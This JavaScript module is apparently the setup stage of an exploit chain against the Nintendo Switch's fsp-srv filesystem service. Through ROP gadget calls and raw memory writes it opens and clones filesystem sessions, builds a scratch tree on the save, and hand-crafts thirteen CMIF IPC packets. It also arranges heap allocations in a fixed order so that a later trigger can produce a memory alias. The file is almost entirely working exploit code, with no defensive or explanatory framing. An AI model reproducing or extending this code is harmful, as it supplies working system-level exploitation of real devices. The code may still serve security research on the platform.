import coreRuntime from "../runtime.mjs";

const {
    F_Tick,
    GADGET_MEMCPY,
    allocPage,
    allocWorkerResources,
    applyCmifContext,
    borrowThreadScheduling,
    buildWaveFrames,
    findSvcSetCoreMask,
    call_rop,
    cloneFsSession,
    cloneObject,
    cmifReply,
    createGateBlock,
    findLastSendIndex,
    findSendForPacket,
    getMountHandle,
    hex32,
    ipcCommit,
    ipcCreateDirectory,
    ipcCreateFile,
    ipcFreeSpace,
    ipcGetEntryType,
    normalizedPath,
    openContentStorage,
    openFspSession,
    prepPacket,
    removeScratchTree,
    sendIPC,
    write32,
    write64,
    write8,
    writeStr,
    writeXDesc
} = coreRuntime;

// ----- Setup steps (S1 to S10) -----

/**
 * S1: take control of how the raw threads the exploit already owns get
 * scheduled. The worker priorities need 13 contiguous slots under Horizon's limit.
 */
export async function borrowRawThreadScheduling() {
    const rawScheduling = borrowThreadScheduling();

    if (!rawScheduling) {
        return failedStep("raw-thread-scheduling-unavailable");
    }

    /*
     * Worker priorities form one contiguous range from this base. Check that the
     * whole range fits under Horizon's priority limit before any worker starts.
     */
    if (findSvcSetCoreMask() === 0n) {
        return failedStep("svc-set-core-mask-not-found");
    }

    if (rawScheduling.priority + 12 > 63) {
        return failedStep("priority-range-too-narrow",
                          "base=" + rawScheduling.priority + "; need=13");
    }

    return {ok: true, rawScheduling};
}

/**
 * S2: open the fsp-srv root session plus two clones of the save filesystem. The
 * root session is the one promoted later. A failed clone here leaves the attempt
 * with no save to work in.
 */
export async function openFspSessions({helpers}) {
    const handles = {
        auxiliaryStorageHandle: 0,
        candidateHandle: 0,
        extentTriggerHandle: 0,
        extraStorages: [],
        pinHandle: 0,
        rootClones: [],
        saveClones: [],
        storageHandle: 0,
        triggerHandle: 0
    };

    const rootSession = openFspSession();

    if (!rootSession) {
        return failedStep("fsp-session-open-failed");
    }

    const pktBuf = allocPage(0x2000);
    let savedHandle;
    let temporaryHandle;
    const cleanupHandles = () => helpers.cleanup({
        ...handles, rootSession, savedHandle, temporaryHandle
    });

    const saveMount = getMountHandle("save");

    if (!saveMount) {
        cleanupHandles();
        return failedStep("save-mount-unavailable");
    }

    savedHandle = cloneObject(saveMount.handle, saveMount.objId);

    if (!savedHandle) {
        cleanupHandles();
        return failedStep("save-filesystem-clone-failed");
    }

    temporaryHandle = cloneObject(saveMount.handle, saveMount.objId);

    if (!temporaryHandle) {
        cleanupHandles();
        return failedStep("temporary-filesystem-clone-failed");
    }

    return {ok: true, pktBuf, handles: {
        ...handles, rootSession, savedHandle, temporaryHandle
    }};
}

/**
 * S3: create the /hole scratch tree, the dirty file and the canary chain. Every
 * command is guarded, because a half-built /hole is worse than a missing one:
 * each failure removes the tree before it returns.
 */
export async function createScratchTree({
    config,
    helpers,
    handleResources,
    savedHandle,
    temporaryHandle
}) {
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        savedHandle, temporaryHandle
    });
    const failScratch = failure => {
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failure;
    };

    const SCRATCH_DIR = "/hole";
    const dirtyFilePath = SCRATCH_DIR + "/commit_data";
    const canaryPath = normalizedPath(SCRATCH_DIR + "/canary", config.CANARY_LENGTH);
    const selectedDir = SCRATCH_DIR + "/selected";
    const segmentSalt = Number(call_rop(F_Tick) & 0x1FFFFFFFFFFFn).toString(10);
    const segments = ["S0_" + segmentSalt, "S1_" + segmentSalt, "S2_" + segmentSalt];
    const markerPath = SCRATCH_DIR + "/" + segments[0] + "/" + segments[1] + "/" + segments[2] + "/SPAN_MARKER";

    const scratchBefore = ipcGetEntryType(savedHandle, SCRATCH_DIR);

    if (scratchBefore.error !== 0x202) {
        return failScratch(failedStep("scratch-path-must-be-absent",
                                      "result=" + hex32(scratchBefore.error)));
    }

    const freeSpace = ipcFreeSpace(savedHandle, "/");
    const requiredBytes = config.DIRTY_FILE_SIZE + 0x500000;

    if (freeSpace.error !== 0 || freeSpace.bytes <= requiredBytes) {
        return failScratch(failedStep("insufficient-save-free-space",
                                      "result=" + hex32(freeSpace.error) + "; bytes=" +
            freeSpace.bytes + "; requiredMoreThan=" + requiredBytes));
    }

    const scratchRootFailure = createScratchRoot(savedHandle, SCRATCH_DIR);

    if (scratchRootFailure) {
        return failScratch(scratchRootFailure);
    }

    const dirtyFileResult = ipcCreateFile(savedHandle, dirtyFilePath,
                                          config.DIRTY_FILE_SIZE);

    if (dirtyFileResult !== 0) {
        return failScratch(failedStep("dirty-file-create-failed",
                                      "result=" + hex32(dirtyFileResult)));
    }

    const canaryFailure = createCanaryChain(savedHandle, canaryPath);

    if (canaryFailure) {
        return failScratch(canaryFailure);
    }

    const abortControl = sendAbortControl(savedHandle);

    if (!abortControl.ok) {
        return failScratch(abortControl);
    }

    const selectedDirectoryResult = ipcCreateDirectory(savedHandle, selectedDir);

    if (selectedDirectoryResult !== 0) {
        return failScratch(failedStep("selected-directory-create-failed",
                                      "result=" + hex32(selectedDirectoryResult)));
    }

    const spanFailure = createSpanTree(temporaryHandle, SCRATCH_DIR, segments, markerPath);

    if (spanFailure) {
        return failScratch(spanFailure);
    }

    const scratchTreeCommitFailure = commitScratchTree(savedHandle);

    if (scratchTreeCommitFailure) {
        return failScratch(scratchTreeCommitFailure);
    }

    return {ok: true, SCRATCH_DIR, abortControlCanonical: abortControl.abortControlCanonical,
        canaryPath, dirtyFilePath, segments, selectedDir,
        setupPath: abortControl.setupPath, setupPkt: abortControl.setupPkt};
}

/** Create /hole on the save and commit it, so the tree exists on the media before the dirty writes start. */
function createScratchRoot(savedHandle, SCRATCH_DIR) {
    const createResult = ipcCreateDirectory(savedHandle, SCRATCH_DIR);
    let commitResult = null;

    if (createResult === 0) {
        commitResult = ipcCommit(savedHandle);
    }

    if (createResult === 0 && commitResult === 0) {
        return null;
    }

    let commitDetail = "not-run";

    if (commitResult !== null) {
        commitDetail = hex32(commitResult);
    }

    return failedStep("scratch-root-create-or-commit-failed",
                      "create=" + hex32(createResult) + "; commit=" + commitDetail);
}

/** Create the canary path one directory at a time, then the file at the end of it. */
function createCanaryChain(savedHandle, canaryPath) {
    const canaryParts = canaryPath.slice(1).split("/");
    let directories = 0;
    let mkdirFailure = null;

    for (let i = 2; i < canaryParts.length; i++) {
        const result = ipcCreateDirectory(savedHandle, "/" + canaryParts.slice(0, i).join("/"));

        /*
         * 0x402 means the directory is already there. An earlier attempt can
         * leave part of the chain behind, and that is no failure.
         */
        if (result !== 0 && (result & 0x3FFFFF) !== 0x402) {
            mkdirFailure = {index: i, pathLength: canaryParts
                .slice(0, i).join("/").length + 1, result};
            break;
        }

        directories++;
    }

    const createResult = mkdirFailure
        ? 0xFFFFFFFF
        : ipcCreateFile(savedHandle, canaryPath, 1);

    if (!mkdirFailure && createResult === 0) {
        return null;
    }

    let failureDetail = "pathLen=" + canaryPath.length + "; dirs=" +
        directories + "/" + (canaryParts.length - 2);

    if (mkdirFailure) {
        failureDetail += "; mkdirAt=" + mkdirFailure.index +
            "; mkdirLen=" + mkdirFailure.pathLength +
            "; mkdirResult=" + hex32(mkdirFailure.result);
    }

    return failedStep("canary-chain-create-failed",
                      failureDetail + "; create=" + hex32(createResult));
}

/**
 * Send one request with an empty path. Its canonical result becomes the
 * reference the copy waves compare their own replies against.
 */
function sendAbortControl(savedHandle) {
    const setupPkt = allocPage(0x2000);
    const setupPath = allocPage(0x1000);

    write8(setupPath, 0n);
    prepPacket(setupPkt, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(setupPkt, 8, setupPath, 1);
    write32(setupPkt + 0x10n, 0x49434653n);
    write32(setupPkt + 0x18n, 7n);

    const abortTransport = Number(sendIPC(savedHandle, setupPkt)) >>> 0;

    if (abortTransport !== 0) {
        return failedStep("abort-control-transport-failed",
                          "transport=" + hex32(abortTransport));
    }

    return {
        ok: true,
        abortControlCanonical: cmifReply(setupPkt).result & 0x3FFFFF,
        setupPath,
        setupPkt
    };
}

/** Build the nested S0/S1/S2 chain on the temporary save, then drop the marker inside it. */
function createSpanTree(temporaryHandle, SCRATCH_DIR, segments, markerPath) {
    let running = SCRATCH_DIR;

    for (let i = 0; i < segments.length; i++) {
        running += "/" + segments[i];
        const spanDirectoryResult = ipcCreateDirectory(temporaryHandle, running);

        if (spanDirectoryResult !== 0) {
            return failedStep("span-directory-create-failed",
                              "index=" + i + "; result=" + hex32(spanDirectoryResult));
        }
    }

    const spanMarkerResult = ipcCreateFile(temporaryHandle, markerPath, 1);

    if (spanMarkerResult !== 0) {
        return failedStep("span-marker-create-failed",
                          "result=" + hex32(spanMarkerResult));
    }

    return null;
}

/*
 * Commit the scratch-tree metadata before any wave adds its DIRTY_FILE_SIZE
 * bytes. Left dirty, that metadata can push the BC save past its roughly 8 MiB
 * outstanding-dirty cap, which poisons the filesystem session.
 */
function commitScratchTree(savedHandle) {
    const commitResult = ipcCommit(savedHandle);

    if (commitResult !== 0) {
        return failedStep("scratch-tree-commit-failed",
                          "result=" + hex32(commitResult));
    }

    return null;
}

/**
 * S4: open the primary IStorage and its clones. Six save clones and four root
 * clones fill the worker slots, so the wave layout fixes the count.
 */
export async function openStorageAndClones({
    helpers,
    handleResources,
    SCRATCH_DIR,
    rootSession,
    savedHandle
}) {
    const saveClones = [];
    const rootClones = [];

    const storageHandle = openContentStorage(rootSession);
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        storageHandle, saveClones, rootClones
    });

    if (!storageHandle) {
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("primary-storage-open-failed");
    }

    for (let i = 0; i < 6; i++) {
        const handle = cloneFsSession(savedHandle);

        if (!handle) {
            removeScratchTree(savedHandle, SCRATCH_DIR);
            cleanupHandles();
            return failedStep("save-filesystem-clone-failed",
                              "index=" + i);
        }

        saveClones.push(handle);
    }
    for (let i = 0; i < 4; i++) {
        const handle = cloneFsSession(rootSession);

        if (!handle) {
            removeScratchTree(savedHandle, SCRATCH_DIR);
            cleanupHandles();
            return failedStep("root-filesystem-clone-failed",
                              "index=" + i);
        }

        rootClones.push(handle);
    }

    return {ok: true, rootClones, saveClones, storageHandle};
}

/** S5: clone the two handles the trigger packets send through. */
export async function openTriggerHandles({
    helpers,
    handleResources,
    SCRATCH_DIR,
    savedHandle,
    temporaryHandle
}) {
    const triggerHandle = cloneFsSession(savedHandle);
    const extentTriggerHandle = cloneFsSession(temporaryHandle);
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        triggerHandle, extentTriggerHandle
    });

    if (!triggerHandle || !extentTriggerHandle) {
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("trigger-handle-clone-failed",
                          "trigger=" + Boolean(triggerHandle) + "; extent=" +
            Boolean(extentTriggerHandle));
    }

    return {ok: true, extentTriggerHandle, triggerHandle};
}

/**
 * S6: allocate the packet and path buffers. Their allocation order is part of
 * the heap layout the alias depends on, so never sort them or batch them together.
 */
export function allocatePacketBuffers({
    config,
    SCRATCH_DIR,
    canaryPath
}) {
    const extentTotal = config.EXTENT_SIZE + 1;
    const triggerBuf = allocPage(0x2000);
    const fragmentBufs = [];

    for (let i = 0; i < 4; i++) {
        fragmentBufs.push(allocPage(0x2000));
    }

    const canaryBufMem = allocPage(0x1000);
    writeStr(canaryBufMem, canaryPath);

    const guardPath = normalizedPath(SCRATCH_DIR + "/absent", 0x300);
    const guardPathC = guardPath.slice(0, -1) + "C";
    const guardBuf0 = allocPage(0x1000);
    const guardBuf1 = allocPage(0x1000);
    writeStr(guardBuf0, guardPath);
    writeStr(guardBuf1, guardPathC);

    const fillerSrc = "/NS2_SRC00000000";
    const fillerDst = normalizedPath(SCRATCH_DIR + "/page_absent", 0x7EF);
    const fillerBuf0 = allocPage(0x1000);
    const fillerBuf1 = allocPage(0x1000);
    writeStr(fillerBuf0, fillerSrc);
    writeStr(fillerBuf1, fillerDst);

    return {ok: true, canaryBufMem, extentTotal, fillerBuf0, fillerBuf1,
        fillerDst, fillerSrc, fragmentBufs, guardBuf0, guardBuf1, guardPath,
        guardPathC, triggerBuf};
}

/**
 * S7: build the 13 role packets. A packet's index in `REQ` is its worker slot,
 * so each one is written in place instead of through a loop.
 */
export function buildIpcRequests({
    config,
    canaryBufMem,
    canaryPath,
    fillerBuf0,
    fillerBuf1,
    fragmentBufs,
    guardBuf0,
    guardBuf1,
    triggerBuf
}) {
    const REQ = [];

    for (let i = 0; i < 13; i++) {
        REQ.push(allocPage(0x2000));
    }

    // Role 0: Commit (cmd 10)
    prepPacket(REQ[0], 4, 8, [[16, 0x49434653], [24, 10]]);

    // W1's IStorage::Read receives WAVE_READ_SIZE bytes through this B descriptor.
    const bottleneckRecv = allocPage(config.WAVE_READ_SIZE + 0x2000);
    prepPacket(REQ[1], (4 | (1 << 24)) >>> 0, 0x0C, []);
    write32(REQ[1] + 8n, BigInt(config.WAVE_READ_SIZE));
    write32(REQ[1] + 12n, BigInt(Number(bottleneckRecv & 0xFFFFFFFFn)));
    write32(REQ[1] + 16n, BigInt(((1 | (Number((bottleneckRecv >> 36n) & 7n) << 2) |
        (Number((bottleneckRecv >> 32n) & 15n) << 28)) >>> 0)));
    write32(REQ[1] + 0x20n, 0x49434653n);
    write32(REQ[1] + 0x28n, 0n);
    write64(REQ[1] + 0x30n, 0n);
    write64(REQ[1] + 0x38n, BigInt(config.WAVE_READ_SIZE));

    // Roles 2-5: fragment cmd 1002
    for (let i = 0; i < 4; i++) {
        prepPacket(REQ[2 + i], (4 | (1 << 16)) >>> 0, 8,
                   [[16, 0x49434653], [24, 1002]]);
        writeXDesc(REQ[2 + i], 8, fragmentBufs[i], config.SLOT_SIZE);
    }

    // Role 6: canary GetEntryType (cmd 7)
    prepPacket(REQ[6], (4 | (1 << 16)) >>> 0, 8, [[16, 0x49434653], [24, 7]]);
    writeXDesc(REQ[6], 8, canaryBufMem, canaryPath.length + 1);

    // Roles 7-8: filler RenameFile (cmd 5)
    for (let idx = 7; idx <= 8; idx++) {
        prepPacket(REQ[idx], (4 | (2 << 16)) >>> 0, 8,
                   [[32, 0x49434653], [40, 5]]);
        writeXDesc(REQ[idx], 8, fillerBuf0, 16);
        writeXDesc(REQ[idx], 16, fillerBuf1, 0x7F0, 1);
    }

    // Role 9 support packets: pin, clear, pre-release
    const pinPkt = allocPage(0x2000);
    const clearPkt = allocPage(0x2000);
    const prePkt = allocPage(0x2000);
    prepPacket(pinPkt, 4, 8, [[16, 0x49434653], [24, 200]]);
    write32(pinPkt, 6n); write32(pinPkt + 20n, 1n); write32(pinPkt + 28n, 9n);
    prepPacket(clearPkt, 4, 8, [[16, 0x49434653], [24, 1009]]);
    write32(clearPkt, 6n); write32(clearPkt + 20n, 1n); write32(clearPkt + 28n, 9n);
    prepPacket(prePkt, 4, 8, [[16, 0x49434653], [24, 1009]]);
    write32(prePkt, 6n); write32(prePkt + 20n, 1n); write32(prePkt + 28n, 9n);

    // Role 9: CloseObject
    prepPacket(REQ[9], 4, 8, []);
    write8(REQ[9] + 16n, 2n);
    write32(REQ[9] + 20n, 0n);
    write32(REQ[9] + 28n, 0n);

    // Roles 10-11: guard RenameFile (cmd 5)
    prepPacket(REQ[10], (4 | (2 << 16)) >>> 0, 8,
               [[32, 0x49434653], [40, 5]]);
    writeXDesc(REQ[10], 8, guardBuf0, 0x301);
    writeXDesc(REQ[10], 16, guardBuf1, 0x301, 1);
    prepPacket(REQ[11], (4 | (2 << 16)) >>> 0, 8,
               [[32, 0x49434653], [40, 5]]);
    writeXDesc(REQ[11], 8, guardBuf0, 0x301);
    writeXDesc(REQ[11], 16, guardBuf1, 0x301, 1);

    // Role 12: trigger GetEntryType (cmd 7)
    prepPacket(REQ[12], (4 | (1 << 16)) >>> 0, 8,
               [[16, 0x49434653], [24, 7]]);
    writeXDesc(REQ[12], 8, triggerBuf, config.SLOT_SIZE);

    return {ok: true, REQ, clearPkt, pinPkt, prePkt};
}

/**
 * S8: prove that the filler and guard path pairs resolve as absent, then open
 * the auxiliary storage the alias copy uses.
 */
export async function checkPathPair({
    config,
    helpers,
    handleResources,
    SCRATCH_DIR,
    fillerDst,
    fillerSrc,
    guardPath,
    guardPathC,
    rootSession,
    savedHandle
}) {
    let auxiliaryStorageHandle;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        auxiliaryStorageHandle
    });

    const fillersActive = config.workerRoles.includes(7) ||
        config.workerRoles.includes(8);
    let fillerControlOk = true;

    if (fillersActive) {
        const fillerControl = await helpers.checkPathPairQuiet(fillerSrc, 16, fillerDst, 0x7F0,
                                                               {savedHandle, returnDiagnostics: true});
        fillerControlOk = fillerControl.ok;
    }

    let guardControl = null;

    if (fillerControlOk) {
        guardControl = await helpers.checkPathPairQuiet(guardPath, 0x301, guardPathC, 0x301,
                                                        {savedHandle, returnDiagnostics: true});
    }

    let guardControlOk = null;

    if (guardControl) {
        guardControlOk = guardControl.ok;
    }

    const controlOk = Boolean(fillerControlOk && guardControlOk);

    if (!controlOk) {
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        let guardControlDetail = "not-run";

        if (guardControlOk !== null) {
            guardControlDetail = String(Boolean(guardControlOk));
        }

        return failedStep("path-pair-control-failed",
                          "filler=" + Boolean(fillerControlOk) + "; guard=" +
            guardControlDetail);
    }

    // Auxiliary IStorage.
    auxiliaryStorageHandle = openContentStorage(rootSession);

    if (!auxiliaryStorageHandle) {
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("auxiliary-storage-open-failed");
    }

    return {ok: true, auxiliaryStorageHandle};
}

/**
 * S9: stamp every packet with the CMIF context id its service expects. Role 9
 * carries no object, so it stays untouched.
 */
export function applyCmifContexts({
    REQ,
    clearPkt,
    pinPkt,
    prePkt
}) {
    for (let roleIndex = 0; roleIndex < 13; roleIndex++) {
        let contextId = 9;

        if (roleIndex === 0 || (roleIndex >= 2 && roleIndex <= 5)) {
            contextId = 3;
        }

        if (roleIndex !== 9) {
            applyCmifContext(REQ[roleIndex], contextId);
        }
    }
    applyCmifContext(pinPkt, 9);
    applyCmifContext(clearPkt, 9);
    applyCmifContext(prePkt, 9);

    return {ok: true};
}

/**
 * S10: build the plans, gates and packet backups the wave orchestrator sends. A
 * sent worker mutates its own frame, so pin, clear and pre each keep a pristine
 * copy to restore from before the next wave.
 */
export async function prepareWaveInfrastructure({
    helpers,
    REQ,
    clearPkt,
    pinPkt,
    prePkt,
    rootClones,
    saveClones,
    storageHandle,
    triggerBuf,
    triggerHandle,
    config,
    rootSession
}) {
    const roleHandles = [
        saveClones[0], storageHandle, rootClones[0], rootClones[1],
        rootClones[2], rootClones[3], saveClones[1], saveClones[2],
        saveClones[3], 0, saveClones[4], saveClones[5], triggerHandle
    ];

    const gates = createGateBlock();
    const plans = helpers.buildPlans({config: config, REQ, clearPkt,
        gates, pinPkt, prePkt, roleHandles,
        rootSession: rootSession, triggerBuf});
    const sendIndices = plans.map(findLastSendIndex);
    const pinSendIndex = findSendForPacket(plans[9], pinPkt);
    const clearSendIndex = findSendForPacket(plans[9], clearPkt);
    const preSendIndex = findSendForPacket(plans[9], prePkt);

    const waveData = buildWaveFrames(plans, REQ, triggerBuf, sendIndices);
    const workerResources = allocWorkerResources(13);

    const pinBk = allocPage(0x2000);
    call_rop(GADGET_MEMCPY, pinBk, pinPkt, 0x1000n);
    const clearBk = allocPage(0x2000);
    call_rop(GADGET_MEMCPY, clearBk, clearPkt, 0x1000n);
    const preBk = allocPage(0x2000);
    call_rop(GADGET_MEMCPY, preBk, prePkt, 0x1000n);

    const waveExtra = {
        packets: [
            { pkt: pinPkt, backup: pinBk },
            { pkt: clearPkt, backup: clearBk },
            { pkt: prePkt, backup: preBk }
        ],
        triggerBuf: triggerBuf,
        triggerFirstByte: 0x2F
    };

    return {ok: true, clearSendIndex, gates, pinSendIndex, preSendIndex, roleHandles, sendIndices, waveData, waveExtra, workerResources};
}

/** Failure shape shared by the setup steps: a reason code plus optional detail. */
function failedStep(failureReason, failureDetail) {
    const result = {ok: false, failureReason};

    if (failureDetail) {
        result.failureDetail = failureDetail;
    }

    return result;
}
